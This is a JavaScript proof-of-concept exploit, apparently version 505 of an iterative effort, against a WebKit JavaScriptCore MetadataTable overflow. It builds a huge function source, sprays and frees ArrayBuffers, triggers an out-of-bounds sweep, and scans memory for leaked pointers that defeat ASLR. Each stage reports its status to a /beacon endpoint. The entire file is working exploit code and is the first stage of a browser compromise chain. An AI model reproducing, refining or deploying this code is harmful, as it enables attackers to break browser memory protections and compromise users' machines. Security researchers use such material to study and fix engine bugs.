// p505 — MetadataTable overflow ASLR leak: clean function body
//
// V504 crashed after CALLING. Root cause: window.__v504ok=1 INSIDE the function
// body has metadata (op_resolve_scope, op_put_by_id) at OOB addresses that were
// corrupted by the sweep. Even slow-path access could crash on corrupted data.
//
// FIX: Function body contains ONLY the if-typeof block. Nothing else.
// op_ret (implicit return) has no metadata access → safe.
// Check success OUTSIDE the function via try-catch.
//
// PROVEN: V503 COMPILED-OK + CALLING with compile-first approach.
// if(0) generates all bytecodes (verified in WK-1400 NodesCodegen.cpp).
//
// Beacon prefix: V505-
(function() {
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V505-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }
  function hexB(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function hex8(view, off) {
    var s = '';
    for (var i = 7; i >= 0; i--) s += hexB(view[off + i]);
    return s;
  }
  function u32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT', navigator.userAgent);

  // ═══ PHASE 1: Build function blob — CLEAN BODY (no post-block code) ═══
  var N = 38348816;
  var CHUNK = 4000000;
  var nC = Math.floor(N / CHUNK);
  var rem = N - nC * CHUNK;

  B('BUILD', 'N=' + N);

  var rep = 'a();'.repeat(CHUNK);
  var parts = new Array(nC + 3);
  // Clean body: ONLY the if-typeof block. Nothing after.
  // op_ret (implicit) has no metadata → can't crash.
  parts[0] = 'window.__v505fn=function(a){if(typeof a==="string"){';
  for (var c = 0; c < nC; c++) parts[1 + c] = rep;
  parts[nC + 1] = 'a();'.repeat(rem);
  parts[nC + 2] = '}};';
  rep = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  B('BLOB', 'sz=' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var blobUrl = URL.createObjectURL(blob);
  var sc = document.createElement('script');

  sc.onerror = function() { B('SCRIPT-ERR', ''); };

  sc.onload = function() {
    B('COMPILED', window.__v505fn ? 'OK' : 'FAIL');
    if (!window.__v505fn) { B('DONE', 'no-fn'); return; }

    URL.revokeObjectURL(blobUrl);
    blob = null; sc = null;

    // ═══ PHASE 2: Spray ABs (AFTER compile — proven by p142 + V503) ═══
    var BUF_SZ = 100112;
    var SPRAY_N = 100;

    var bufs = new Array(SPRAY_N);
    for (var i = 0; i < SPRAY_N; i++) bufs[i] = new ArrayBuffer(BUF_SZ);
    B('SPRAY', 'n=' + SPRAY_N);

    // Transfer first half → holes
    var xferred = 0;
    for (var i = 0; i < SPRAY_N / 2; i++) {
      try {
        structuredClone(bufs[i], {transfer: [bufs[i]]});
        xferred++;
      } catch(e) { if (!xferred) { B('XFER-ERR', e.message.substring(0,40)); break; } }
      bufs[i] = null;
    }
    B('XFER', 'n=' + xferred);

    var views = [];
    for (var i = Math.floor(SPRAY_N / 2); i < SPRAY_N; i++) {
      if (bufs[i] && bufs[i].byteLength === BUF_SZ)
        views.push(new Uint8Array(bufs[i]));
    }
    B('VIEWS', 'n=' + views.length);

    // ═══ PHASE 3: GC → free holes ═══
    setTimeout(function() {
      for (var g = 0; g < 10; g++) {
        var junk = []; for (var j = 0; j < 40000; j++) junk.push({x:j}); junk = null;
      }
      B('GC-DONE');

      // ═══ PHASE 4: Call function → re-parse → finishCreation → sweep ═══
      B('CALLING');

      var survived = false;
      try {
        window.__v505fn(0); // typeof 0 === "string" → false → skip → ret
        survived = true;
      } catch(e) {
        B('CALL-ERR', (e.message||'').substring(0,60));
      }
      B('CALL-DONE', survived ? 'SURVIVED' : 'THREW');

      window.__v505fn = null;

      if (survived) {
        setTimeout(doScan, 50);
      } else {
        B('DONE', 'call-failed');
      }
    }, 500);
  };

  document.head.appendChild(sc);
  sc.src = blobUrl;

  function doScan() {
    B('SCAN-START');
    var hitBufs = 0, leakedPtrs = [];

    for (var vi = 0; vi < views.length; vi++) {
      var view = views[vi];
      if (!view) continue;

      var hasNZ = false;
      for (var q = 0; q < view.length && !hasNZ; q += 4) {
        if (view[q] | view[q+1] | view[q+2] | view[q+3]) hasNZ = true;
      }
      if (!hasNZ) continue;
      hitBufs++;

      var nz = 0;
      for (var j = 0; j < view.length; j++) if (view[j]) nz++;
      B('HIT-' + vi, 'nz=' + nz);

      if (hitBufs > 5) break;

      // Find entry alignment via 0xFFFFFFFF sentinel at entry+12
      var bestBase = -1, bestHits = 0;
      for (var tryBase = 0; tryBase < 112; tryBase += 4) {
        var hits = 0;
        for (var off = tryBase + 12; off + 4 <= view.length; off += 112) {
          if (u32(view, off) === 0xFFFFFFFF) hits++;
        }
        if (hits > bestHits) { bestHits = hits; bestBase = tryBase; }
      }
      B('EBASE-' + vi, 'base=' + bestBase + ',hits=' + bestHits);

      // Extract thunk pointers at entry+24
      var ptrs = 0;
      for (var eOff = bestBase; eOff + 32 <= view.length && ptrs < 8; eOff += 112) {
        if (u32(view, eOff + 12) !== 0xFFFFFFFF) continue;
        var pOff = eOff + 24;
        var anyNZ = false;
        for (var b = 0; b < 8; b++) if (view[pOff+b]) { anyNZ = true; break; }
        if (!anyNZ) continue;
        var h = hex8(view, pOff);
        B('THUNK-' + ptrs, 'off=' + pOff + ',val=0x' + h);
        leakedPtrs.push(h);
        ptrs++;
      }

      // Check m_bytecodeIndex at entry+68
      var idxs = 0;
      for (var eOff = bestBase; eOff + 72 <= view.length && idxs < 5; eOff += 112) {
        var val = u32(view, eOff + 68);
        if (val > 0 && val < 40000000) {
          B('IDX-' + idxs, 'off=' + (eOff+68) + ',val=' + val);
          idxs++;
        }
      }

      // Raw hex dump first 336 bytes of first hit
      if (hitBufs === 1) {
        var ch = [];
        for (var off = 0; off + 8 <= 336 && off + 8 <= view.length; off += 8) {
          if (view[off]|view[off+1]|view[off+2]|view[off+3]|
              view[off+4]|view[off+5]|view[off+6]|view[off+7])
            ch.push(off + ':' + hex8(view, off));
        }
        if (ch.length) B('RAW', ch.slice(0,15).join(' '));
      }
    }

    B('RESULT', 'hitBufs=' + hitBufs + ',ptrs=' + leakedPtrs.length + ',views=' + views.length);

    if (leakedPtrs.length > 0) {
      var p0 = leakedPtrs[0];
      var pref = p0.substring(0, 8);
      var con = 0;
      for (var i = 0; i < leakedPtrs.length; i++)
        if (leakedPtrs[i].substring(0,8) === pref) con++;
      B('ASLR-LEAK', 'ptr0=0x' + p0 + ',total=' + leakedPtrs.length + ',consistent=' + con);
    } else if (hitBufs > 0) {
      B('SWEEP-HIT', 'no-ptrs');
    } else {
      B('NO-HIT', 'all-zero');
    }

    B('DONE', 'hitBufs=' + hitBufs + ',ptrs=' + leakedPtrs.length);
  }
})();
